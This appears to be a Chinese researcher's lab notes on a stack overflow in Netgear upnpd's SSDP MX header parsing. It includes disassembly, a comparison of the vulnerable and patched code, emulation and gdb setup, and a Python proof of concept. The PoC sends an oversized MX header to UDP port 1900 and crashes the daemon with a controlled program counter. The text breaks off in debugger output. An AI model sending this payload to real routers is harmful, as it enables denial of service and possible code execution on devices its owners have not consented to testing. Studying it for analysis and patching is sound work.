<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 通告中：SSDP消息中的MX头字段</span><br><span class="line">.rodata:0003E848 aMx             DCB &quot;MX:&quot;,0             ; DATA XREF: my_vulnee+28↑o</span><br><span class="line"># 交叉引用找到sub_21078</span><br><span class="line">.text:00021078 my_vulnee                               ; CODE XREF: sub_22038+188↓p</span><br><span class="line">.text:00021078</span><br><span class="line">.text:00021078 var_90          = -0x90</span><br><span class="line">.text:00021078 str             = -0x8C</span><br><span class="line">.text:00021078</span><br><span class="line">.text:00021078                 PUSH            &#123;R4-R6,LR&#125;</span><br><span class="line">.text:0002107C                 MOV             R4, #0</span><br><span class="line">.text:00021080                 SUB             SP, SP, #0x80</span><br><span class="line">.text:00021084                 MOV             R5, R0  ; 参数1，请求</span><br><span class="line">.text:00021088                 MOV             R1, R4  ; c</span><br><span class="line">.text:0002108C                 MOV             R2, #0x7C ; &apos;|&apos; ; n</span><br><span class="line">.text:00021090                 ADD             R0, SP, #0x90+str ; s</span><br><span class="line">.text:00021094                 STR             R4, [SP,#0x90+var_90]</span><br><span class="line">.text:00021098                 BL              memset</span><br><span class="line">.text:0002109C                 MOV             R0, R5</span><br><span class="line">.text:000210A0                 LDR             R1, =aMx ; &quot;MX:&quot;</span><br><span class="line">.text:000210A4                 BL              stristr ; 从请求内容中找到MX头</span><br><span class="line">.text:000210A8                 SUBS            R5, R0, #0</span><br><span class="line">.text:000210AC                 BEQ             loc_21114</span><br><span class="line">.text:000210B0                 LDR             R1, =(aSetsockopt1+0xC) ; &quot;\r\n&quot;</span><br><span class="line">.text:000210B4                 BL              stristr ; 从mx头中找其结尾</span><br><span class="line">.text:000210B8                 SUBS            R6, R0, #0 ; 尾部位置</span><br><span class="line">.text:000210BC                 BEQ             loc_21120</span><br><span class="line">.text:000210C0                 ADD             R1, R5, #3 ; 跳过&quot;mx:&quot;，取值，作为src</span><br><span class="line">.text:000210C4                 CMP             R6, R1</span><br><span class="line">.text:000210C8                 BLS             loc_21104</span><br><span class="line">.text:000210CC                 RSB             R2, R1, R6 ; 尾部-首部，作为n</span><br><span class="line">.text:000210CC                                         ; 如此控制大小n，形同虚设，mx:1234，n=4</span><br><span class="line">.text:000210D0                 MOV             R0, SP  ; 栈空间，作为dest</span><br><span class="line">.text:000210D4                 BL              strncpy ; overflow！</span><br><span class="line"></span><br><span class="line"># bindiff</span><br><span class="line">0.9867301027026377	0.9899582273570628	00021078	sub_00021078	Normal	000210B8	sub_000210B8	Normal</span><br></pre></td></tr></table></figure>
<ul>
<li>如何修复</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 旧，v62，尽管是strncpy，但控制n的方法白给</span></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">my_vulnee</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> dst_buff; <span class="comment">// [sp+0h] [bp-90h] BYREF 尽管非局部数组，也是局部指针，其指向内存空间在栈</span></span><br><span class="line"></span><br><span class="line">  mx_header = stristr(a1, <span class="string">"MX:"</span>);</span><br><span class="line">  mx_header_1 = mx_header;</span><br><span class="line">  <span class="keyword">if</span> ( !mx_header || (mx_end = stristr(mx_header, <span class="string">"\r\n"</span>)) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nullsub_1(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( mx_end &lt;= mx_header_1 + <span class="number">3</span> )              <span class="comment">// +3跳过"MX:"</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;dst_buff, (mx_header_1 + <span class="number">3</span>), &amp;mx_end[-mx_header_1 - <span class="number">3</span>]);<span class="comment">// overflow</span></span><br><span class="line">                                                <span class="comment">// -mx_header_1 - 3 = - (mx_header_1 + 3)</span></span><br><span class="line">                                                <span class="comment">// 尾部位置-首部位置，即此mx的len</span></span><br><span class="line">                                                <span class="comment">// 如此控制n，形同虚设</span></span><br><span class="line"><span class="comment">// 新，v68，对n限制大小</span></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">sub_210B8</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mx_header = stristr(a1, <span class="string">"MX:"</span>);</span><br><span class="line">  mx_header_1 = mx_header;</span><br><span class="line">  <span class="keyword">if</span> ( !mx_header || (mx_end = stristr(mx_header, <span class="string">"\r\n"</span>)) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    nullsub_1(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  mx_begin = (mx_header_1 + <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mx_end &lt;= mx_header_1 + <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  mx_len = mx_end - mx_begin;</span><br><span class="line">  <span class="keyword">if</span> ( (mx_end - mx_begin) &gt;= <span class="number">127</span> )             <span class="comment">// 强行对n限制，最大127</span></span><br><span class="line">    mx_len = <span class="number">127</span>;</span><br><span class="line">  <span class="built_in">strncpy</span>(&amp;dst_buff, mx_begin, mx_len);</span><br></pre></td></tr></table></figure>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
<li>设置最小长度以显示”MX:”字符串</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ida中明明有"MX:"字符串，但strings窗口中没有</span></span><br><span class="line">.rodata:0003E848 aMx             DCB <span class="string">"MX:"</span>,0</span><br><span class="line"><span class="comment"># strings工具也没有</span></span><br><span class="line">strings upnpd-62 | grep MX</span><br><span class="line"></span><br><span class="line"><span class="comment"># stings工具：需要指定最小长度，-n 3，默认是4</span></span><br><span class="line">$ strings upnpd-62 -n 3 | grep MX</span><br><span class="line">MX:</span><br><span class="line"></span><br><span class="line"><span class="comment"># ida中：strings窗口右键、setup、修改minimal string length为3，默认5</span></span><br><span class="line">.rodata:0003E848	00000004	C	MX:</span><br></pre></td></tr></table></figure>
<ul>
<li>注意漏洞描述是TCP 还是 UDP，以及相应端口号！！！</li>
<li>123</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 怎么区分各种arm版本</span></span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">arm      arm_any  armv2    armv2a   armv3    armv3m   armv4    armv4t   armv5    armv5t   armv5te</span><br></pre></td></tr></table></figure>
<h2 id="程序执行"><a href="#程序执行" class="headerlink" title="程序执行"></a>程序执行</h2><ul>
<li>模拟执行：利用qemu-system-arm，qemu_arm虚拟机</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 参考Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现：https://paper.seebug.org/1311/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改nvram.ini（其它默认没改</span></span><br><span class="line">lan_ipaddr=10.10.10.2</span><br><span class="line">lan_hwaddr=52:54:00:12:34:56</span><br><span class="line">hwver=R8500<span class="comment"># 没改，实测无影响</span></span><br><span class="line">friendly_name=R8300<span class="comment"># 没改，实测无影响</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行</span></span><br><span class="line">LD_PRELOAD=<span class="string">"/custom_nvram_r6250.so /lib/libdl.so.0"</span> /usr/sbin/upnpd</span><br><span class="line"><span class="comment"># ps</span></span><br><span class="line"> 2472 0          2864 S   /usr/sbin/upnpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 是基于UDP的1900端口，切莫搞错</span></span><br><span class="line"><span class="comment"># /tmp/busybox-armv7l netstat -atp（错误）</span></span><br><span class="line">tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      2472/upnpd</span><br><span class="line"><span class="comment"># /tmp/busybox-armv7l netstat -aup （正确）</span></span><br><span class="line">udp        0      0 0.0.0.0:1900            0.0.0.0:*                           2801/upnpd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无法http访问</span></span><br><span class="line">http://10.10.10.2:1900/<span class="comment"># 错误，http基于tcp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 无法端口转发，只能本子网中实验</span></span><br><span class="line">ssh -L 9000:10.10.10.2:1900 192.168.142.188<span class="comment"># 错误，udp端口不能用ssh来转发，因为ssh基于tcp的</span></span><br></pre></td></tr></table></figure>
<ul>
<li>手头有R6400v2的设备，二者硬件环境应该相似，直接将upnpd拷进去执行即可，免得模拟</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 拷贝至设备</span></span><br><span class="line"><span class="built_in">cd</span> tmp</span><br><span class="line">wget http://192.168.10.2:8000/upnpd-62</span><br><span class="line">chmod +x upnpd-62</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 kill原有的</span></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line"> 9461 admin      4364 S   upnpd</span><br><span class="line">15140 admin      2900 S   grep upnpd</span><br><span class="line"><span class="comment"># killall upnpd</span></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line">15325 admin      2876 D   grep upnpd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 成功执行</span></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line">15325 admin      2876 D   grep upnpd</span><br><span class="line"><span class="comment"># ./upnpd-62</span></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line">15717 admin      2492 S   ./upnpd-62</span><br><span class="line">15721 admin      2892 R   grep upnpd</span><br></pre></td></tr></table></figure>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 参考</span></span><br><span class="line">google:python 组播</span><br><span class="line">https://www.cnblogs.com/lsdb/p/<span class="number">9408947.</span>html</span><br><span class="line"></span><br><span class="line"><span class="comment"># poc.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">mcast_group_ip = <span class="string">'192.168.10.1'</span></span><br><span class="line">mcast_group_port = <span class="number">1900</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sender</span><span class="params">()</span>:</span></span><br><span class="line">    send_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)</span><br><span class="line">    send_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="number">2</span>)</span><br><span class="line">    message = <span class="string">'M-SEARCH * HTTP/1.1\r\nST: ssdp:discover\r\nMX: 33333333333333333333333333333333333333333333333333333333333333333333333333\r\nMAN: "ssdp:discover"\r\nHOST: 239.255.255.250:1900\r\n\r\n'</span></span><br><span class="line">    send_sock.sendto(message.encode(), (mcast_group_ip, mcast_group_port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sender()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行后，程序被打死</span></span><br><span class="line">python3 poc.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line"><span class="number">15717</span> admin      <span class="number">2492</span> S   ./upnpd<span class="number">-62</span></span><br><span class="line"><span class="number">15721</span> admin      <span class="number">2892</span> R   grep upnpd</span><br><span class="line"><span class="comment"># ps |grep upnpd</span></span><br><span class="line"><span class="number">16104</span> admin      <span class="number">2876</span> R   grep upnpd</span><br></pre></td></tr></table></figure>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><ul>
<li>远程调试</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看目标架构</span></span><br><span class="line">file upnpd-62</span><br><span class="line">upnpd-62: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找合适的gdbserver（静态链接的</span></span><br><span class="line">find . -<span class="built_in">type</span> f | xargs file | grep <span class="string">"ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV)"</span></span><br><span class="line">./gdbserver.armv7_7.7: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, with debug_info, not stripped</span><br><span class="line"></span><br><span class="line"><span class="comment"># 传输 gdbserver.armv7_7.7 到设备</span></span><br><span class="line">wget http://192.168.10.2:8000/gdbserver.armv7_7.7</span><br><span class="line">chmod +x gdbserver.armv7_7.7</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看帮助，可能每个都不一样</span></span><br><span class="line">./gdbserver.armv7_7.7 --<span class="built_in">help</span><span class="comment"># 有的是-h</span></span><br><span class="line">Usage:  gdbserver [OPTIONS] COMM PROG [ARGS ...]</span><br><span class="line">        gdbserver [OPTIONS] --attach COMM PID</span><br><span class="line">        gdbserver [OPTIONS] --multi COMM</span><br><span class="line"></span><br><span class="line">COMM may either be a tty device (<span class="keyword">for</span> serial debugging), or</span><br><span class="line">HOST:PORT to listen <span class="keyword">for</span> a TCP connection.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --debug               Enable general debugging output.</span><br><span class="line">  --remote-debug        Enable remote protocol debugging output.</span><br><span class="line">  --version             Display version information and <span class="built_in">exit</span>.</span><br><span class="line">  --wrapper WRAPPER --  Run WRAPPER to start new programs.</span><br><span class="line">  --once                Exit after the first connection has closed.</span><br><span class="line">Report bugs to <span class="string">"&lt;http://www.gnu.org/software/gdb/bugs/&gt;"</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动gdbserver</span></span><br><span class="line"><span class="comment"># 不写ip表0.0.0.0表任意</span></span><br><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 :1234 upnpd-62</span></span><br><span class="line">Process upnpd-62 created; pid = 24881</span><br><span class="line">Listening on port 1234</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb</span></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch </span><br><span class="line">GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">"show copying"</span></span><br><span class="line">and <span class="string">"show warranty"</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">"x86_64-linux-gnu"</span>.</span><br><span class="line">Type <span class="string">"show configuration"</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">"help"</span>.</span><br><span class="line">Type <span class="string">"apropos word"</span> to search <span class="keyword">for</span> commands related to <span class="string">"word"</span>.</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture armv5t<span class="comment"># 怎么确定具体架构，直接arm行不行？</span></span><br><span class="line">The target architecture is assumed to be armv5t</span><br><span class="line">pwndbg&gt; file upnpd-62 <span class="comment"># 要从中读取符号，同gdb + 程序 同效果</span></span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">break</span> *main</span><br><span class="line">Breakpoint 1 at 0x22530</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/<span class="comment"># 设置根目录，否则找不到共享库</span></span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/lib/ld-uClibc.so.0:</span><br><span class="line">Remote connection closed</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string">set endian little# 设置大小端</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q upnpd-62 </span></span><br><span class="line"><span class="string">pwndbg: loaded 194 commands. Type pwndbg [filter] for a list.</span></span><br><span class="line"><span class="string">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span></span><br><span class="line"><span class="string">Reading symbols from upnpd-62...(no debugging symbols found)...done.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string"># lxl@ubuntu:~/Desktop/000$ md5sum squashfs-root/lib/ld-uClibc.so.0</span></span><br><span class="line"><span class="string">9294078b30f80793a5994290ebe671fb  squashfs-root/lib/ld-uClibc.so.0</span></span><br><span class="line"><span class="string"># md5sum /lib/ld-uClibc.so.0</span></span><br><span class="line"><span class="string">9294078b30f80793a5994290ebe671fb  /lib/ld-uClibc.so.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#</span></span><br></pre></td></tr></table></figure>
<ul>
<li>daemon进程</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1 正常启动：前台启动（并未指定&amp;），但是其没有输出，也未卡在前台，加之名字d结尾，应该是守护进程daemon</span></span><br><span class="line"><span class="comment"># ps |grep upnp</span></span><br><span class="line"> 5721 admin      2876 S   grep upnp</span><br><span class="line"><span class="comment"># ./upnpd-62</span></span><br><span class="line"><span class="comment"># ps |grep upnp</span></span><br><span class="line"> 5781 admin      2492 S   ./upnpd-62</span><br><span class="line"> 5795 admin      2876 S   grep upnp</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 2 调试器启动：注意是正常退出，推测fork了子进程，父进程正常结束</span></span><br><span class="line"><span class="comment"># ps |grep upnp</span></span><br><span class="line"> 9066 admin      2876 S   grep upnp</span><br><span class="line"><span class="comment"># ./gdb-arm-static-7.11 -q upnpd-62 # quiet不打印版本等信息</span></span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x22534</span><br><span class="line">Starting program: /tmp/upnpd-62</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, 0x00022534 <span class="keyword">in</span> main ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[Inferior 1 (process 9128) exited normally]<span class="comment"># 正常退出</span></span><br><span class="line">(gdb) q</span><br><span class="line"><span class="comment"># ps |grep upnp</span></span><br><span class="line"> 9168 admin      2492 S   /tmp/upnpd-62</span><br><span class="line"> 9212 admin      2876 S   grep upnp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 跟随子进程（默认跟父）：确实创建了子进程</span></span><br><span class="line"><span class="comment"># ./gdb-arm-static-7.11 -q upnpd-62</span></span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) <span class="built_in">set</span> follow-fork-mode child<span class="comment"># 默认parent</span></span><br><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x22534</span><br><span class="line">Starting program: /tmp/upnpd-62</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, 0x00022534 <span class="keyword">in</span> main ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[New process 9616]<span class="comment"># 新进程</span></span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line"> 9533 admin      6700 S   ./gdb-arm-static-7.11 -q upnpd-62</span><br><span class="line"> 9616 admin      2492 S   /tmp/upnpd-62<span class="comment"># pid匹配</span></span><br><span class="line"> 9931 admin      2892 R   grep upnp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 ida静态分析：没有fork函数，有daemon（会调用fork）</span></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( daemon(1, 1) == -1 )</span><br></pre></td></tr></table></figure>
<ul>
<li>本地调试：gdb直接启动</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gdb启动程序并continue后，执行poc（python3 poc.py</span></span><br><span class="line"><span class="comment"># 需要set follow-fork-mode child，因为创建子进程后父进程正常退出</span></span><br><span class="line"><span class="comment"># ./gdb-arm-static-7.11 -q upnpd-62</span></span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">(gdb) <span class="built_in">set</span> follow-</span><br><span class="line">follow-exec-mode  follow-fork-mode</span><br><span class="line">(gdb) <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">(gdb) start</span><br><span class="line">Temporary breakpoint 1 at 0x22534</span><br><span class="line">Starting program: /tmp/upnpd-62</span><br><span class="line"></span><br><span class="line">Temporary breakpoint 1, 0x00022534 <span class="keyword">in</span> main ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">[New process 9616]</span><br><span class="line"></span><br><span class="line">Thread 2.1 <span class="string">"upnpd-62"</span> received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[Switching to process 9616]</span><br><span class="line">0x33333332 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<ul>
<li>本地调试：gdb附加进程</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 正常启动程序，gdb附加并continue后，执行poc（python3 poc.py</span></span><br><span class="line"><span class="comment"># 不需set follow-fork-mode child，因为附加的就是已经创建好的子进程（为守护进程</span></span><br><span class="line"><span class="comment"># ./upnpd-62</span></span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">12698 admin      2492 S   ./upnpd-62</span><br><span class="line">12886 admin      2892 S   grep upnp</span><br><span class="line"><span class="comment"># ./gdb-arm-static-7.11 -q --pid=12698</span></span><br><span class="line">Attaching to process 12698</span><br><span class="line">Reading symbols from /tmp/upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /usr/lib/libnvram.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /usr/lib/libacos_shared.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /usr/lib/libnat.so...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/libcrypt.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/libgcc_s.so.1...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/libc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/libm.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Reading symbols from /lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">0x401a44cc <span class="keyword">in</span> select () from /lib/libc.so.0</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x33333332 <span class="keyword">in</span> ?? ()</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
<ul>
<li>远程调试：gdbserver启动程序//here</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 :1234 upnpd-62</span></span><br><span class="line">Process upnpd-62 created; pid = 14238</span><br><span class="line">Listening on port 1234</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">lxl@ubuntu:~/Desktop/000$ gdb-multiarch -q</span><br><span class="line">pwndbg: loaded 194 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/<span class="built_in">break</span>)</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> endian little </span><br><span class="line">The target is assumed to be little endian</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; file upnpd-62 </span><br><span class="line">Reading symbols from upnpd-62...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> sysroot ./squashfs-root/</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> follow-fork-mode child</span><br><span class="line">pwndbg&gt; target remote 192.168.10.1:1234</span><br><span class="line">Remote debugging using 192.168.10.1:1234</span><br><span class="line">Reading symbols from ./squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">Error <span class="keyword">while</span> reading shared library symbols <span class="keyword">for</span> ./squashfs-root/lib/ld-uClibc.so.0:</span><br><span class="line">Remote connection closed</span><br><span class="line">/build/gdb-veKdC1/gdb-8.1.1/gdb/thread.c:93: internal-error: thread_info* inferior_thread(): Assertion `tp<span class="string">' failed.</span></span><br><span class="line"><span class="string">A problem internal to GDB has been detected,</span></span><br><span class="line"><span class="string">further debugging may prove unreliable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This is a bug, please report it.  For instructions, see:</span></span><br><span class="line"><span class="string">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Aborted (core dumped)</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/000$ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># </span></span><br><span class="line"><span class="string"># ./gdbserver.armv7_7.7 :1234 upnpd-62</span></span><br><span class="line"><span class="string">Process upnpd-62 created; pid = 14238</span></span><br><span class="line"><span class="string">Listening on port 1234</span></span><br><span class="line"><span class="string">Remote debugging from host 192.168.10.2</span></span><br><span class="line"><span class="string">Segmentation fault</span></span><br></pre></td></tr></table></figure>
<ul>
<li>–debug</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># ps|grep upnp</span></span><br><span class="line">17500 admin      2872 R   grep upnp</span><br><span class="line"><span class="comment"># ./gdbserver.armv7_7.7 --debug :1234 upnpd-62</span></span><br><span class="line">new_argv[0] = <span class="string">"upnpd-62"</span></span><br><span class="line">Process upnpd-62 created; pid = 17555</span><br><span class="line">linux_wait: [Process 17555]</span><br><span class="line">linux_wait_for_lwp: &lt;all threads&gt;</span><br><span class="line">my_waitpid (-1, 0x40000000)</span><br><span class="line">blocking</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (-1, 0x1): status(57f), 17555</span><br><span class="line">Got an event from 17555 (57f)</span><br><span class="line">stop pc is 400f5930</span><br><span class="line">pc is 0x400f5930</span><br><span class="line">stop pc is 0x400f5930</span><br><span class="line">stop pc is 400f5930</span><br><span class="line">linux_wait_for_lwp: pc is 0x400f5930</span><br><span class="line">my_waitpid (17556, 0x0)</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (17556, 0x0): status(137f), 17556</span><br><span class="line">my_waitpid (17556, 0x0)</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (17556, 0x0): status(1057f), 17556</span><br><span class="line">my_waitpid (17557, 0x0)</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (17557, 0x0): status(137f), 17557</span><br><span class="line">my_waitpid (17557, 0x0)</span><br><span class="line">sigchld_handler</span><br><span class="line">my_waitpid (17557, 0x0): status(9), 17557</span><br><span class="line">my_waitpid (sigchld_handler</span><br><span class="line">17556, 0x0)</span><br><span class="line">my_waitpid (17556, 0x0): status(117f), 17556</span><br><span class="line">my_waitpid (17556, 0x0)</span><br><span 